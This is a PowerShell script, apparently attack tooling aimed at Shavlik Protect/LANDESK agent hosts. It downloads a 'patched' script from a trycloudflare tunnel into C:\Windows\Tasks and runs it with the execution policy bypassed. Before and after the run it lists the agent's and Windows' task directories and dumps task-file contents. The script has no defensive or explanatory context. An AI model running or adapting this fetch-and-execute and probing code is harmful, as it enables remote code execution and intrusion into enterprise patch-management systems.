param([string]$TunnelUrl = "https://taxes-surprised-immediately-transportation.trycloudflare.com")

# Download run_patched_simple.ps1 from server
$s = (iwr -Uri "$TunnelUrl/scripts/run_patched_simple.ps1" -UseBasicParsing).Content
Set-Content "C:\Windows\Tasks\run_patched_simple.ps1" $s -Encoding UTF8
Write-Host "Downloaded $($s.Length) bytes"

# Check for task files before
$before = Get-ChildItem "C:\Windows\System32\tasks\*.txt" -ErrorAction SilentlyContinue
Write-Host "Before: $($before.Count) txt files in System32\tasks"

$before2 = Get-ChildItem "$env:WINDIR\Tasks\*.txt" -ErrorAction SilentlyContinue
Write-Host "Before: $($before2.Count) txt files in Windows\Tasks"

# Now run patched available-tasks
$result = powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Tasks\run_patched_simple.ps1" -Command "available-tasks" -TimeoutSeconds 15 2>&1 | Out-String
Write-Host "Result: $result"

# Check for task files after
Start-Sleep -Seconds 2
$after = Get-ChildItem "C:\Windows\System32\tasks\*.txt" -ErrorAction SilentlyContinue
Write-Host "After System32\tasks:"
$after | ForEach-Object { Write-Host "  $($_.Name) size=$($_.Length)" }

# Also check agent dir
$agentTasks = "C:\Program Files\LANDESK\Shavlik Protect Agent\tasks"
if (Test-Path $agentTasks) {
    Get-ChildItem "$agentTasks\*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "  Agent\tasks\$($_.Name) size=$($_.Length) content: $(Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue)"
    }
} else {
    Write-Host "Agent\tasks dir does not exist"
}

# Check current directory of STDispatch - look at what dirs have tasks\ dir
Get-ChildItem "C:\Program Files\LANDESK\Shavlik Protect\*\tasks\*" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "LANDESK tasks: $($_.FullName)"
}

Write-Host "Done"
